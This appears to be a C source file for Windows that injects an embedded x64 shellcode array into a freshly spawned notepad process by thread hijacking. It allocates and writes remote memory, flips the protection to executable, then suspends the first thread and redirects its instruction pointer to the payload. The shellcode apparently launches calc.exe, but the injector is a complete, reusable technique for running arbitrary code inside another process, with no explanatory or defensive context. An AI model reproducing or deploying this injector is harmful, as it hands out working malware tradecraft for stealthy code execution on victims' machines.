#include <Windows.h>
#include <tlhelp32.h>
#include <tchar.h>

unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

HANDLE GetHandleToFirstThreadOfProcess(DWORD procId)
{
    HANDLE hThreadSnap = INVALID_HANDLE_VALUE;
    THREADENTRY32 te32;
    te32.dwSize = sizeof(THREADENTRY32);

    hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap == INVALID_HANDLE_VALUE)
    {
        return NULL;
    }

    if (!Thread32First(hThreadSnap, &te32))
    {
        CloseHandle(hThreadSnap);     
        return NULL;
    }

    do
    {
        if (te32.th32OwnerProcessID == procId)
        {
            // return handle to first thread of target proc
            return OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
        }
    } while (Thread32Next(hThreadSnap, &te32));

    return NULL;
}


int main()
{
    /*
    void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
    */

    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcessW(NULL, _tcsdup(TEXT("notepad")), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        _tprintf(TEXT("[!] CreateProcess failed (%d).\n"), GetLastError());
        return 1;
    }
    WaitForSingleObject(pi.hProcess, 1000); // Allow notepad 1 second to start/initialize. 

    HANDLE targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pi.dwProcessId);
    if (!targetProcessHandle)
    {
        _tprintf(TEXT("[!] OpenProcess failed (%d).\n"), GetLastError());
        return 1;
    }

    LPVOID allocMem = VirtualAllocEx(pi.hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); // <-
    if (!allocMem)
    {
        _tprintf(TEXT("[!] VirtualAllocEx failed (%d).\n"), GetLastError());
        return 1;
    }

    if (WriteProcessMemory(targetProcessHandle, allocMem, shellcode, sizeof(shellcode), nullptr) == 0)
    {
        _tprintf(TEXT("[!] WriteProcessMemory failed (%d).\n"), GetLastError());
        return 1;
    }
    
    DWORD op;
    if (!VirtualProtectEx(pi.hProcess, allocMem, sizeof(shellcode), PAGE_EXECUTE, &op))
    {
        _tprintf(TEXT("[!] VirtualProtectEx failed (%d).\n"), GetLastError());
        return 1;
    }

    HANDLE hThread = GetHandleToFirstThreadOfProcess(pi.dwProcessId);
    if (!hThread)
    {
        _tprintf(TEXT("[!] OpenThread failed (%d).\n"), GetLastError());
        return 1;
    }

    if (SuspendThread(hThread) == (DWORD)-1)
    {
        _tprintf(TEXT("[!] SuspendThread failed (%d).\n"), GetLastError());
        return 1;
    }

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(hThread, &ctx))
    {
        _tprintf(TEXT("[!] GetThreadContext failed (%d).\n"), GetLastError());
        return 1;
    }

    ctx.Rip = (DWORD_PTR)allocMem;

    if (!SetThreadContext(hThread, &ctx))
    {
        _tprintf(TEXT("[!] GetThreadContext failed (%d).\n"), GetLastError());
        return 1;
    }

    if (!ResumeThread(hThread))
    {
        _tprintf(TEXT("[!] ResumeThread failed (%d).\n"), GetLastError());
        return 1;
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}